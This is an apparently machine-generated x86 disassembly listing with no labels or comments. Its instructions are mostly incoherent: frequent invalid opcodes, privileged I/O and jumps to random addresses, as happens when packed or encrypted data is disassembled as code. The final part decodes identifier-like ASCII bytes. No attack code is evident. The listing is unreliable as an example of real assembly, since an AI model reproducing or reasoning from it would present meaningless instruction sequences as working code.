  41003e:	mov    ah,0x16
  410040:	and    ebx,ecx
  410042:	xchg   esi,eax
  410043:	mov    al,0x2c
  410045:	pop    ecx
  410046:	adc    esi,DWORD PTR [ecx+0x67]
  410049:	sub    BYTE PTR [edx],al
  41004b:	pop    eax
  41004c:	popa   
  41004d:	jnp    0x41007b
  41004f:	adc    esi,edx
  410051:	sbb    eax,0xa959c582
  410056:	xchg   ebp,eax
  410057:	pop    es
  410058:	lods   al,BYTE PTR ds:[esi]
  410059:	xlat   BYTE PTR ds:[ebx]
  41005a:	(bad)  
  41005b:	dec    ebp
  41005c:	add    edx,DWORD PTR ds:0x6122c01d
  410062:	test   BYTE PTR [ebx-0x18],ah
  410065:	ja     0x4100aa
  410067:	repnz and al,BYTE PTR [edi-0x246f6934]
  41006e:	lods   al,BYTE PTR ds:[esi]
  41006f:	fnstcw WORD PTR [esi-0x65]
  410072:	jnp    0x410055
  410074:	setb   BYTE PTR [esi-0x5cdd958e]
  41007b:	(bad)  
  41007c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41007d:	cli    
  41007e:	dec    ebx
  41007f:	mov    ds:0x89f4f13,al
  410084:	loope  0x4100d5
  410086:	call   FWORD PTR [ebp-0x631369fc]
  41008c:	adc    al,0x8d
  41008e:	xchg   esp,eax
  41008f:	test   ch,ch
  410091:	es in  al,0x48
  410094:	inc    edi
  410095:	fmul   DWORD PTR [ebx-0xe]
  410098:	push   eax
  410099:	add    al,0x9a
  41009b:	inc    edi
  41009c:	call   0x61fadb16
  4100a1:	inc    edi
  4100a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100a3:	fcomp  QWORD PTR [ecx+0x30cad7a2]
  4100a9:	cmp    al,0x9c
  4100ab:	inc    edx
  4100ac:	mov    dl,0xf1
  4100ae:	push   esi
  4100af:	ret    0x587b
  4100b2:	retf   0xe5aa
  4100b5:	or     edi,eax
  4100b7:	sar    DWORD PTR [eax+0x2d3ff2a2],1
  4100bd:	les    ebx,FWORD PTR [edx]
  4100bf:	xchg   ecx,eax
  4100c0:	mov    DWORD PTR [ebx],edx
  4100c2:	cs mov ch,0x86
  4100c5:	jmp    0x3c3:0xd56656fb
  4100cc:	xlat   BYTE PTR ds:[ebx]
  4100cd:	push   ecx
  4100ce:	retf   0xdb07
  4100d1:	cmp    BYTE PTR [edi],0x55
  4100d4:	(bad)  
  4100d5:	fistp  QWORD PTR [eax]
  4100d7:	mov    ecx,0x5ab09934
  4100dc:	mov    ds:0x663f3695,eax
  4100e1:	or     BYTE PTR [edx-0x75],ch
  4100e4:	not    DWORD PTR [ecx]
  4100e6:	mov    ah,0x17
  4100e8:	lahf   
  4100e9:	(bad)  
  4100eb:	pop    ecx
  4100ec:	(bad)  
  4100ed:	sub    edx,DWORD PTR [ecx]
  4100ef:	aaa    
  4100f0:	xchg   ecx,eax
  4100f1:	stc    
  4100f2:	in     al,0xef
  4100f4:	mov    ah,0xbb
  4100f6:	imul   ebp,DWORD PTR [edx],0x43c48a76
  4100fc:	(bad)  
  4100fd:	lods   eax,DWORD PTR ds:[esi]
  4100fe:	jp     0x4100d1
  410100:	push   esi
  410101:	push   ebx
  410102:	mov    ebp,0xf25eb481
  410107:	ret    0x5c70
  41010a:	fadd   DWORD PTR fs:[esi-0x4d]
  41010e:	mov    esi,DWORD PTR [eax]
  410110:	mov    WORD PTR [edx],ss
  410112:	std    
  410113:	mov    edi,0x17bf8bde
  410118:	dec    esi
  410119:	in     al,dx
  41011a:	xor    BYTE PTR [edx],dl
  41011c:	fistp  QWORD PTR [ebx-0x32]
  41011f:	dec    ebp
  410120:	or     eax,0x7f1b5581
  410125:	iret   
  410126:	sahf   
  410127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410128:	scas   eax,DWORD PTR es:[edi]
  410129:	(bad)  
  41012a:	and    BYTE PTR [edi],al
  41012c:	mov    BYTE PTR [ebp-0x3d385f7d],ah
  410132:	mov    eax,0x146fc519
  410137:	dec    edx
  410138:	rol    DWORD PTR [edi+0x6d],cl
  41013b:	mov    ss,WORD PTR [ebp+0x12]
  41013e:	sbb    DWORD PTR [esi-0x59],esp
  410141:	fwait
  410142:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410144:	fisttp QWORD PTR [esi+0x407fa46c]
  41014a:	xchg   edi,eax
  41014b:	sub    edi,ebx
  41014d:	mov    al,ds:0xf92429cc
  410152:	adc    al,0x78
  410154:	test   BYTE PTR [edx+edi*2],dl
  410157:	test   DWORD PTR [esi+0x20],eax
  41015a:	pop    ecx
  41015b:	shl    DWORD PTR [edi+0x57],1
  41015e:	inc    esp
  41015f:	out    0x3b,al
  410161:	cdq    
  410162:	jae    0x4101c3
  410164:	xchg   ecx,eax
  410165:	outs   dx,BYTE PTR ds:[esi]
  410166:	aaa    
  410167:	fs or  DWORD PTR es:[edx-0x285452d7],0xffffffa3
  410170:	mov    ds:0x49485630,eax
  410175:	inc    edi
  410176:	jmp    0x3f6e2613
  41017b:	(bad)  
  41017c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41017d:	mov    ch,BYTE PTR [eax+eax*1]
  410180:	mov    al,ds:0xe08e1dca
  410185:	hlt    
  410186:	out    0xc8,al
  410188:	bound  esp,QWORD PTR [edi+0x6eef588]
  41018e:	aas    
  41018f:	xchg   BYTE PTR [ebx-0xa522f9c],ah
  410195:	icebp  
  410196:	dec    esp
  410197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410198:	mov    esi,fs
  41019a:	and    DWORD PTR [ecx],esi
  41019c:	mov    bh,0x1b
  41019e:	pop    edx
  41019f:	or     cl,BYTE PTR [edi]
  4101a1:	push   eax
  4101a2:	loopne 0x410187
  4101a4:	jmp    0x58771c95
  4101a9:	sbb    eax,0xeaa9192c
  4101ae:	jo     0x41015e
  4101b0:	in     al,dx
  4101b1:	sub    ch,bl
  4101b3:	xchg   ecx,eax
  4101b4:	dec    ebx
  4101b5:	and    al,BYTE PTR [esi+0x35b86f4d]
  4101bb:	(bad)  
  4101bc:	and    ebx,DWORD PTR ds:0xc9f4de7e
  4101c2:	dec    ebp
  4101c3:	and    ax,0xd58d
  4101c7:	cmp    BYTE PTR [ebx-0x4f],0x78
  4101cb:	jp     0x4101dd
  4101cd:	mov    al,ds:0xfc1dc37c
  4101d2:	sub    eax,0xb7702aa0
  4101d7:	jne    0x41017c
  4101d9:	xchg   ah,dh
  4101db:	lods   eax,DWORD PTR ds:[esi]
  4101dc:	mov    ss,edi
  4101de:	jns    0x41025d
  4101e0:	out    dx,al
  4101e1:	sub    al,0x29
  4101e3:	mov    edi,ebp
  4101e5:	arpl   si,dx
  4101e7:	push   0xffffffed
  4101e9:	sub    DWORD PTR [esi+eax*4-0x26dd4cf7],edx
  4101f0:	mov    cs,WORD PTR [esp+ebx*8+0x7c]
  4101f4:	dec    edi
  4101f5:	sub    edx,DWORD PTR [edi+0x58]
  4101f8:	mov    ecx,0x83ce42be
  4101fd:	jnp    0x4101e2
  4101ff:	mov    ah,0xb7
  410201:	mov    cl,0x81
  410203:	test   cl,bh
  410205:	int3   
  410206:	pop    eax
  410207:	xchg   ebx,eax
  410208:	imul   esp,ebx,0x5b15c94e
  41020e:	daa    
  41020f:	push   ds
  410210:	cs sub al,0x33
  410213:	imul   BYTE PTR [esi+edx*2+0x71]
  410217:	out    dx,al
  410218:	adc    ecx,ebx
  41021a:	push   0xffffffeb
  41021c:	xchg   esi,eax
  41021d:	cs aas 
  41021f:	int3   
  410220:	test   al,0x8
  410222:	mov    ds:0x29f4a7f7,al
  410227:	loop   0x4101b1
  410229:	push   esi
  41022a:	out    dx,eax
  41022b:	mov    ebp,esi
  41022d:	or     ecx,DWORD PTR [ebx]
  41022f:	sar    BYTE PTR [edi+0x41b46383],1
  410235:	dec    eax
  410236:	pop    ss
  410237:	jg     0x41026b
  410239:	mov    ecx,0x3b09f2e3
  41023e:	call   0xd50d4571
  410243:	imul   ebx,edi,0xffffffea
  410246:	jnp    0x410273
  410248:	addr16 test eax,0xc13211f0
  41024e:	jae    0x410284
  410250:	or     ecx,esp
  410252:	jle    0x410203
  410254:	push   0x3a
  410256:	mov    ebp,DWORD PTR [edi+esi*8-0x1d]
  41025a:	sub    al,0x59
  41025c:	add    al,0x14
  41025e:	mov    edx,0xf2f36e07
  410263:	mov    edx,0xe552f3dd
  410268:	xchg   DWORD PTR [edi*1+0x5784a0ae],eax
  41026f:	add    al,0x4d
  410271:	inc    eax
  410272:	jecxz  0x410279
  410274:	dec    eax
  410275:	stc    
  410276:	imul   edi,DWORD PTR [eax+0x13],0xa688aaf4
  41027d:	or     eax,0x9458e4ec
  410282:	xchg   ebp,eax
  410283:	outs   dx,BYTE PTR ds:[esi]
  410284:	cld    
  410285:	sub    ebx,DWORD PTR [edi+0x6]
  410288:	push   ds
  410289:	mov    cs,WORD PTR [eax]
  41028b:	inc    edi
  41028c:	hlt    
  41028d:	pop    edi
  41028e:	jle    0x410290
  410290:	out    0x6d,eax
  410292:	add    ebp,DWORD PTR [edi]
  410294:	inc    ebp
  410295:	gs add al,0x5f
  410298:	cld    
  410299:	mov    bh,bl
  41029b:	jno    0x410254
  41029d:	lods   al,BYTE PTR ds:[esi]
  41029e:	in     al,0xc3
  4102a0:	adc    ch,BYTE PTR [eax-0x2774664d]
  4102a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a7:	mov    al,ds:0xbeb1bacb
  4102ac:	mov    dh,0x24
  4102ae:	dec    BYTE PTR [ebp-0x30457658]
  4102b4:	sub    ah,BYTE PTR [eax+0xe]
  4102b7:	retf   
  4102b8:	scas   al,BYTE PTR es:[edi]
  4102b9:	ficomp DWORD PTR [edx-0x182bb53]
  4102bf:	pop    edx
  4102c0:	mov    esp,0x3f3e4341
  4102c5:	add    al,0xcb
  4102c7:	shl    DWORD PTR [ebx],0x90
  4102ca:	fmul   st(5),st
  4102cc:	(bad)  
  4102cd:	pusha  
  4102ce:	and    DWORD PTR [esi-0x3b],esi
  4102d1:	add    bh,cl
  4102d3:	and    ch,ah
  4102d5:	je     0x4102f3
  4102d7:	ret    0xcec8
  4102da:	mov    BYTE PTR [edi+ebx*2-0x1add9922],dl
  4102e1:	xchg   BYTE PTR [eax+0x487a2bb8],bh
  4102e7:	mov    es,eax
  4102e9:	in     eax,dx
  4102ea:	outs   dx,DWORD PTR ds:[esi]
  4102eb:	jae    0x4102a6
  4102ed:	jmp    0xd8ae45c1
  4102f2:	xor    DWORD PTR [ebp-0x293ec38a],0xffffffa7
  4102f9:	jle    0x41034a
  4102fb:	imul   edx,DWORD PTR [ebx-0x42],0x12069972
  410302:	push   ds
  410303:	gs cs or eax,0x1cc9e92c
  41030a:	mov    ch,0xb7
  41030c:	dec    edx
  41030d:	sahf   
  41030e:	pop    esp
  41030f:	fimul  DWORD PTR [esi+0x40]
  410312:	std    
  410313:	cmp    al,bl
  410315:	sub    DWORD PTR [eax+0x256f1e70],ebp
  41031b:	jbe    0x410366
  41031d:	lods   eax,DWORD PTR ds:[esi]
  41031e:	je     0x410374
  410320:	adc    edx,DWORD PTR [ecx]
  410322:	sub    ebp,DWORD PTR [ebp+0x4e]
  410325:	or     ch,al
  410327:	ror    BYTE PTR [esi-0x1ae598d7],0xb7
  41032e:	dec    esp
  41032f:	jno    0x12c7b61
  410335:	or     al,BYTE PTR [ebp-0x5b]
  410338:	mov    eax,0x2f2e807
  41033d:	retf   
  41033e:	outs   dx,BYTE PTR ds:[esi]
  41033f:	lea    ebp,[eax+esi*4-0xe]
  410343:	repnz test al,0xb7
  410346:	call   0x8de1ba22
  41034b:	jns    0x4103c4
  41034d:	psubsw mm3,QWORD PTR [eax+0x68]
  410351:	sbb    al,0x2f
  410353:	fistp  WORD PTR [ecx-0x6d]
  410356:	lods   al,BYTE PTR ds:[esi]
  410357:	fild   QWORD PTR [ecx+0x68]
  41035a:	adc    BYTE PTR ds:0xaecb31af,0xa3
  410361:	nop
  410362:	push   cs
  410363:	pop    ebp
  410364:	mov    bl,0xe8
  410366:	scas   al,BYTE PTR es:[edi]
  410367:	add    DWORD PTR [edi-0x6c],edx
  41036a:	lods   eax,DWORD PTR ds:[esi]
  41036b:	lods   eax,DWORD PTR ds:[esi]
  41036c:	pop    ss
  41036d:	mov    DWORD PTR [edx+0x4b],ebx
  410370:	int    0x38
  410372:	mov    dl,BYTE PTR [ecx+0x15ed4b66]
  410378:	and    ebx,edi
  41037a:	cmp    BYTE PTR [ebx+0x5063c7fb],ch
  410380:	cmp    ebx,DWORD PTR [esi-0x26250253]
  410386:	repnz pop ebp
  410388:	call   0xd334:0x8cad4603
  41038f:	xchg   esi,eax
  410390:	jnp    0x410380
  410392:	inc    esi
  410393:	mov    dh,0x5c
  410395:	mov    ecx,0x1f7eafb
  41039a:	les    edi,FWORD PTR [eax+0x6c]
  41039d:	icebp  
  41039e:	(bad)  
  41039f:	scas   eax,DWORD PTR es:[edi]
  4103a0:	leave  
  4103a1:	sti    
  4103a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103a3:	fs push 0xffffff9f
  4103a6:	ins    DWORD PTR es:[edi],dx
  4103a7:	test   eax,0x627fe19b
  4103ac:	mov    ds:0xcbca5a14,al
  4103b1:	jmp    0x4103ff
  4103b3:	and    BYTE PTR [esi+0x3d43e8b1],bh
  4103b9:	jnp    0x41038e
  4103bb:	pop    ecx
  4103bc:	dec    esp
  4103bd:	lds    esi,FWORD PTR [ebp-0x6a437ab9]
  4103c3:	hlt    
  4103c4:	sub    edx,0xa6b7ab6b
  4103ca:	add    eax,0xeee629ed
  4103cf:	pop    ds
  4103d0:	push   0xffffffb7
  4103d2:	bound  ecx,QWORD PTR [ebx]
  4103d4:	or     eax,0xd08c1a33
  4103d9:	sub    DWORD PTR [ecx+0x22c0ef39],esi
  4103df:	pushf  
  4103e0:	mul    DWORD PTR [edx+0x47]
  4103e3:	xor    BYTE PTR [ebx],bl
  4103e5:	(bad)  
  4103e6:	sbb    eax,0x7dc090ca
  4103eb:	mov    ah,0xc6
  4103ed:	lods   eax,DWORD PTR ds:[esi]
  4103ee:	(bad)  
  4103ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103f0:	(bad)  
  4103f1:	scas   al,BYTE PTR es:[edi]
  4103f2:	add    DWORD PTR [edi+0x46d43591],0x35d7889f
  4103fc:	push   esi
  4103fd:	std    
  4103fe:	xchg   edx,eax
  4103ff:	dec    edx
  410400:	mov    edx,0xddf0dc99
  410405:	lahf   
  410406:	adc    eax,0xdc7f2ea9
  41040b:	int3   
  41040c:	daa    
  41040d:	sub    BYTE PTR [esp+edx*1+0x16d4b97b],al
  410414:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410415:	mov    dh,dl
  410417:	pop    ds
  410418:	pop    ebx
  410419:	pop    es
  41041a:	mov    ah,0xd
  41041c:	add    edx,esp
  41041e:	mov    cl,0xba
  410420:	push   ebp
  410421:	cli    
  410422:	xchg   ecx,eax
  410423:	sbb    bl,BYTE PTR [ecx+eax*1-0x35]
  410427:	jno    0x41049a
  410429:	test   DWORD PTR [edx-0x3b649e73],0xdc881692
  410433:	enter  0x887b,0x6
  410437:	or     ebx,DWORD PTR [esi-0x318abf81]
  41043d:	sbb    ch,bl
  41043f:	test   BYTE PTR [ecx],cl
  410441:	cld    
  410442:	(bad)  
  410443:	shl    DWORD PTR [ecx+eiz*8],1
  410446:	add    ah,0x63
  410449:	jg     0x4103cb
  41044b:	dec    eax
  41044c:	adc    ebp,DWORD PTR [edx-0x1e]
  41044f:	push   edi
  410450:	and    ecx,eax
  410452:	adc    eax,0x82fb40d
  410457:	and    DWORD PTR [ecx+0x36c7b0e6],ebp
  41045d:	push   ss
  41045e:	sbb    al,0x51
  410460:	xor    al,0x66
  410462:	(bad)  
  410463:	cmc    
  410464:	jl     0x410458
  410466:	jnp    0x41043d
  410468:	iret   
  410469:	cmp    eax,0x6eebf46a
  41046e:	mov    ebp,0xb6788d2b
  410473:	mov    eax,0x7261f2a3
  410478:	mov    WORD PTR [ebx+0xa8f7213],?
  41047e:	mov    dh,0x6
  410480:	ss dec ebx
  410482:	enter  0xddd4,0xad
  410486:	cmp    BYTE PTR ds:0x212b1424,bl
  41048c:	mov    dl,0x4d
  41048e:	push   edi
  41048f:	aam    0x72
  410491:	(bad)  
  410492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410493:	jecxz  0x410493
  410495:	inc    edi
  410496:	rcr    bh,1
  410498:	mov    ecx,0xc0dc7260
  41049d:	xchg   esp,eax
  41049e:	(bad)  
  4104a0:	or     BYTE PTR [ecx+0x52],ch
  4104a3:	sahf   
  4104a4:	jge    0x41042d
  4104a6:	icebp  
  4104a7:	ins    DWORD PTR es:[edi],dx
  4104a8:	jle    0x41051a
  4104aa:	push   edi
  4104ab:	int    0x39
  4104ad:	dec    ecx
  4104ae:	ret    0xa130
  4104b1:	push   0xfffffffb
  4104b3:	in     eax,0xd5
  4104b5:	cmp    al,0x37
  4104b7:	add    esi,edi
  4104b9:	add    ecx,DWORD PTR gs:[ebp+0x7de4ce5d]
  4104c0:	push   esi
  4104c1:	xor    DWORD PTR [edi],edi
  4104c3:	jge    0x410493
  4104c5:	mov    al,0xd9
  4104c7:	daa    
  4104c8:	push   edx
  4104c9:	xor    eax,0xf8c16abc
  4104ce:	or     al,0x2a
  4104d0:	jp     0x4104ef
  4104d2:	mov    ebx,0xf1dc7c9c
  4104d7:	jns    0x41048b
  4104d9:	lds    esi,FWORD PTR [edx+0x7d]
  4104dc:	test   eax,0x6c56e293
  4104e1:	in     eax,dx
  4104e2:	(bad)  
  4104e3:	dec    ecx
  4104e4:	popa   
  4104e5:	in     al,dx
  4104e6:	jae    0x41052a
  4104e8:	cmc    
  4104e9:	dec    esi
  4104ea:	paddusw mm4,QWORD PTR [ebp-0x31]
  4104ee:	sub    bl,BYTE PTR [eax+0xe]
  4104f1:	pop    ds
  4104f2:	ret    0x5c27
  4104f5:	aam    0xa6
  4104f7:	jle    0x4104fb
  4104f9:	ret    0xab2f
  4104fc:	mov    bh,0xc8
  4104fe:	dec    esp
  4104ff:	fadd   QWORD PTR [ebp-0x17]
  410502:	repz mov eax,0x783b6180
  410508:	sbb    eax,0xddafa90f
  41050d:	push   ebx
  41050e:	in     al,0xf6
  410510:	ret    0xca57
  410513:	or     esp,edx
  410515:	and    BYTE PTR [ecx+0x2a5d56f0],ch
  41051b:	(bad)  
  41051c:	in     eax,0x2c
  41051e:	xchg   edx,eax
  41051f:	sysexit 
  410521:	push   ebx
  410522:	mov    edi,0x3fa92681
  410527:	in     al,0x75
  410529:	mov    bl,0x19
  41052b:	out    dx,al
  41052c:	cs mov eax,0x733b76e7
  410532:	add    eax,0xb50498f3
  410537:	lahf   
  410538:	jle    0x4104f2
  41053a:	add    eax,0xc89e60c3
  41053f:	hlt    
  410540:	xlat   BYTE PTR ds:[ebx]
  410541:	cmp    eax,0xe8ed46f6
  410546:	lods   eax,DWORD PTR ds:[esi]
  410547:	and    al,0x5
  410549:	or     ch,BYTE PTR [ebx]
  41054b:	push   eax
  41054c:	mov    ah,BYTE PTR [edx]
  41054e:	pop    ecx
  41054f:	xchg   cl,bh
  410551:	jae    0x41053e
  410553:	inc    esp
  410554:	out    0xf3,eax
  410556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410557:	inc    eax
  410558:	pop    es
  410559:	mov    DWORD PTR [ecx-0x166050d7],ebx
  41055f:	jecxz  0x4104e9
  410561:	repz push ebp
  410563:	inc    ecx
  410564:	fistp  QWORD PTR [ebx]
  410566:	mov    edx,eax
  410568:	mov    eax,ds:0x3be49e35
  41056d:	cs xchg edi,eax
  41056f:	mov    dl,0x3f
  410571:	add    ebp,0xeb5bf81d
  410577:	dec    ecx
  410578:	cld    
  410579:	icebp  
  41057a:	push   0x30
  41057c:	daa    
  41057d:	jae    0x410589
  41057f:	dec    eax
  410580:	in     eax,dx
  410581:	pop    esi
  410582:	push   eax
  410583:	popa   
  410584:	fwait
  410585:	gs mov ecx,esp
  410588:	daa    
  410589:	jbe    0x410601
  41058b:	add    DWORD PTR [ebp-0x14fb23f1],ecx
  410591:	fdiv   DWORD PTR [edi+0x39]
  410594:	mov    cs,WORD PTR [esp+ebp*4]
  410597:	pop    edi
  410598:	std    
  410599:	lods   eax,DWORD PTR ds:[esi]
  41059a:	cmp    DWORD PTR [ebx+0x14],ebx
  41059d:	xor    al,0x4a
  41059f:	les    ebp,FWORD PTR [esi-0x42]
  4105a2:	mov    cl,0x2f
  4105a4:	call   0x952362e5
  4105a9:	leave  
  4105aa:	ins    BYTE PTR es:[edi],dx
  4105ab:	pop    eax
  4105ac:	int3   
  4105ad:	arpl   WORD PTR [ecx+0x61],bp
  4105b0:	mov    ch,0xd7
  4105b2:	movlps QWORD PTR [edi+0x57309066],xmm0
  4105b9:	(bad)  
  4105ba:	fisttp WORD PTR [esp+esi*2]
  4105bd:	lods   al,BYTE PTR ds:[esi]
  4105be:	ret    0x5e18
  4105c1:	stos   BYTE PTR es:[edi],al
  4105c2:	jecxz  0x410613
  4105c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105c5:	adc    eax,0x724b28c5
  4105ca:	iret   
  4105cb:	mov    DWORD PTR [ebp-0x390f5439],esp
  4105d1:	mul    BYTE PTR [edx+0x55]
  4105d4:	fistp  QWORD PTR [ecx]
  4105d6:	iret   
  4105d7:	sub    BYTE PTR [ebx+0x16],bh
  4105da:	pop    ecx
  4105db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105dc:	push   ebx
  4105dd:	jmp    0xc3676e3
  4105e2:	inc    edx
  4105e3:	jns    0x41060d
  4105e5:	dec    edx
  4105e6:	xor    ebp,DWORD PTR [edx-0x46d9ded8]
  4105ec:	nop
  4105ed:	xor    esi,DWORD PTR [ecx]
  4105ef:	out    0x40,al
  4105f1:	in     eax,0xa2
  4105f3:	and    DWORD PTR [edi+0x578f4146],eax
  4105f9:	mov    ds:0xd0bd10c0,al
  4105fe:	push   ebp
  4105ff:	cwde   
  410600:	loop   0x4105fd
  410602:	mov    al,ds:0x3845088e
  410607:	and    ah,BYTE PTR [eax-0x56]
  41060a:	mov    dh,0x2d
  41060c:	inc    edi
  41060d:	push   ebp
  41060e:	nop
  41060f:	sti    
  410610:	mov    WORD PTR [edx],ss
  410612:	mov    ch,BYTE PTR [esi+0x26]
  410615:	and    eax,0x4a27d649
  41061a:	scas   eax,DWORD PTR es:[edi]
  41061b:	mov    es,WORD PTR [ebx-0x43]
  41061e:	xchg   ebx,eax
  41061f:	sub    ah,BYTE PTR [eax+0x2c0dc9cb]
  410625:	mov    WORD PTR [edx+0x4c],cs
  410628:	push   es
  410629:	jge    0x41063b
  41062b:	mov    al,0xd8
  41062d:	inc    edi
  41062e:	int    0x72
  410630:	popa   
  410631:	jno    0x410661
  410633:	mov    bl,0x58
  410635:	inc    ebx
  410636:	bound  esp,QWORD PTR [edi+0x224295e0]
  41063c:	pop    esi
  41063d:	jmp    0x410649
  41063f:	pop    si
  410641:	aas    
  410642:	(bad)  
  410644:	lahf   
  410645:	sbb    eax,0x9803927a
  41064a:	pop    edx
  41064b:	push   edx
  41064c:	aas    
  41064d:	bound  edx,QWORD PTR [edx+0x59a4b127]
  410653:	adc    al,BYTE PTR [ecx+ebx*2-0x7e]
  410657:	pop    ecx
  410658:	inc    esp
  410659:	lods   al,BYTE PTR ds:[esi]
  41065a:	fs jmp 0x77300d0c
  410660:	fld    TBYTE PTR [eax+0x3d]
  410663:	scas   al,BYTE PTR es:[edi]
  410664:	jns    0x410628
  410666:	jge    0x4105f8
  410668:	dec    esi
  410669:	pop    edi
  41066a:	push   edx
  41066b:	cdq    
  41066c:	mul    DWORD PTR [ebx]
  41066e:	jmp    0x9915f55
  410673:	loopne 0x410687
  410675:	jo     0x410623
  410677:	pushf  
  410678:	mov    ch,0xb4
  41067a:	or     edi,DWORD PTR [esi+0x1ce5322a]
  410680:	push   ebx
  410681:	out    0xe4,eax
  410683:	or     al,0x3a
  410685:	mov    cl,0x8c
  410687:	jg     0x4106fc
  410689:	dec    esp
  41068a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41068b:	mov    dh,0xb6
  41068d:	adc    BYTE PTR [edx+0x7b1395ab],ch
  410693:	adc    bh,BYTE PTR [ebp-0x56]
  410696:	mov    ch,0xe0
  410698:	push   ebp
  410699:	ficom  DWORD PTR [ebx+0x31]
  41069c:	mov    al,ds:0xed2869ed
  4106a1:	push   eax
  4106a2:	aam    0xa7
  4106a4:	mov    dh,0x26
  4106a6:	pop    esi
  4106a7:	sbb    ebx,ebx
  4106a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106aa:	mov    cl,0xd6
  4106ac:	inc    esp
  4106ad:	cmp    DWORD PTR [esi-0x28f52e97],ebp
  4106b3:	push   ebp
  4106b4:	push   esi
  4106b5:	inc    edi
  4106b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106b7:	mov    ecx,0xd00a635c
  4106bc:	inc    esi
  4106bd:	xor    dl,dl
  4106bf:	xchg   ax,ax
  4106c1:	arpl   si,ax
  4106c3:	inc    eax
  4106c4:	lods   eax,DWORD PTR ds:[esi]
  4106c5:	out    dx,eax
  4106c6:	dec    ecx
  4106c7:	sub    al,0x4b
  4106c9:	inc    edx
  4106ca:	or     edx,ecx
  4106cc:	scas   al,BYTE PTR es:[edi]
  4106cd:	retf   
  4106ce:	arpl   WORD PTR [esp+edx*4-0x1b],bx
  4106d2:	and    bh,bl
  4106d4:	popa   
  4106d5:	add    DWORD PTR [ebx-0x70eefbf4],edx
  4106db:	aad    0xbf
  4106dd:	xchg   ecx,eax
  4106de:	call   0x244bacfa
  4106e3:	jmp    0x766c9d84
  4106e8:	stos   BYTE PTR es:[edi],al
  4106e9:	push   eax
  4106ea:	ja     0x4106d3
  4106ec:	(bad)  
  4106ed:	rcl    DWORD PTR [edx],cl
  4106ef:	inc    edi
  4106f0:	or     esi,DWORD PTR [ecx-0x1adc8759]
  4106f6:	mov    eax,ebp
  4106f8:	sbb    eax,0x2b7880
	...
  41073d:	add    BYTE PTR [eax],al
  41073f:	jnp    0x41075c
  410741:	adc    BYTE PTR [eax],al
  410743:	lods   al,BYTE PTR ds:[esi]
  410744:	push   ebp
  410745:	adc    BYTE PTR [eax],al
  410747:	punpcklwd mm2,DWORD PTR [eax]
  41074a:	add    BYTE PTR [edi+0x6300100d],ch
  410750:	adc    BYTE PTR gs:[eax],al
  410753:	shl    BYTE PTR [edi],0x10
  410756:	add    BYTE PTR [ecx+0x7300101d],dh
  41075c:	js     0x41076e
  41075e:	add    BYTE PTR [ebp+0x38],al
  410761:	xor    eax,0x565f3235
  410766:	aaa    
  410767:	add    BYTE PTR [eax+0x30],dl
  41076a:	push   esp
  41076b:	pop    edi
  41076c:	inc    edi
  41076d:	dec    ebp
  41076e:	xor    bl,BYTE PTR [edx+0x5f]
  410771:	inc    esp
  410772:	ss xor BYTE PTR ss:0x4f494c00,dh
  41077a:	xor    BYTE PTR [edi],dh
  41077c:	pop    edi
  41077d:	dec    edx
  41077e:	inc    ecx
  41077f:	add    BYTE PTR [ecx+0x47],bl
  410782:	pop    edx
  410783:	xor    eax,0x4442595f
  410788:	dec    esi
  410789:	inc    ebx
  41078a:	pop    edi
  41078b:	xor    eax,0x334a0048
  410790:	push   ecx
  410791:	pop    edi
  410792:	xor    al,BYTE PTR [esi+0x35]
  410795:	push   eax
  410796:	cmp    DWORD PTR [eax],edi
  410798:	add    BYTE PTR [ebp+0x32],dl
  41079b:	push   edi
  41079c:	xor    BYTE PTR [edi+0x42],bl
  41079f:	dec    eax
  4107a0:	inc    ebp
  4107a1:	pop    edi
  4107a2:	xor    ebx,DWORD PTR [eax+0x46]
  4107a5:	dec    ebx
  4107a6:	inc    esp
  4107a7:	aaa    
  4107a8:	add    BYTE PTR [edi+0x46],cl
  4107ab:	push   esi
  4107ac:	xor    al,0x34
  4107ae:	pop    edi
  4107af:	inc    edi
  4107b0:	inc    edi
  4107b1:	push   esp
  4107b2:	pop    edx
  4107b3:	inc    edx
  4107b4:	pop    edi
  4107b5:	push   ebp
  4107b6:	add    BYTE PTR [edi+0x41],al
  4107b9:	xor    al,0x39
  4107bb:	xor    BYTE PTR [edi+0x39],bl
  4107be:	inc    edx
  4107bf:	add    BYTE PTR [esi+0x36],cl
  4107c2:	xor    bl,BYTE PTR [edi+0x41]
  4107c5:	xor    ebx,DWORD PTR ss:[edi+0x38]
  4107c9:	xor    eax,DWORD PTR [ecx+0x52]
  4107cc:	push   ebx
  4107cd:	pop    edi
  4107ce:	inc    esi
  4107cf:	add    BYTE PTR [ecx+0x57],al
  4107d2:	push   ebp
  4107d3:	pop    edi
  4107d4:	inc    esi
  4107d5:	pop    edx
  4107d6:	push   ebp
  4107d7:	xor    dh,BYTE PTR [esi]
  4107d9:	add    BYTE PTR [edi+0x48],al
  4107dc:	xor    BYTE PTR [edi+0x33],bl
  4107df:	inc    ebp
  4107e0:	cmp    DWORD PTR [edi+0x5f],ecx
  4107e3:	push   ebx
  4107e4:	cmp    DWORD PTR [eax],eax
  4107e6:	push   esp
  4107e7:	xor    al,0x51
  4107e9:	cmp    BYTE PTR [esi],dh
  4107eb:	pop    edi
  4107ec:	push   esp
  4107ed:	dec    ecx
  4107ee:	dec    edi
  4107ef:	add    BYTE PTR [esp+ecx*2+0x5a],al
  4107f3:	pop    edi
  4107f4:	pop    edx
  4107f5:	dec    edx
  4107f6:	cmp    BYTE PTR [ebx+eax*2+0x5f],dl
